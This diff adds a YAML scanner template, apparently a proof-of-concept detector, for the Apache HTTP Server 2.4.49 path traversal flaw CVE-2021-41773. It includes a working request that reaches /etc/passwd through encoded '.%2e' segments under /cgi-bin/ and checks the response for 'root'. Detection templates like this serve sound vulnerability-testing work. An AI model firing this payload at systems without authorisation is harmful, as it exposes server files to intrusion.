@@ -1,0 +1,21 @@
+name: Apache HTTP Server 2.4.49 Path Traversal CVE-2021-41773
+manual: true
+query: product="Apache-Web-Server" || company="Apache Software Foundation."
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/cve-2021-41773
+  - https://httpd.apache.org/security/vulnerabilities_24.html
+  description: The Apache HTTP Server Project is an effort to develop and maintain
+    an open-source HTTP server for modern operating systems including UNIX and Windows.
+    The goal of this project is to provide a secure, efficient and extensible server
+    that provides HTTP services in sync with the current HTTP standards.
+  tags: pathtraversal
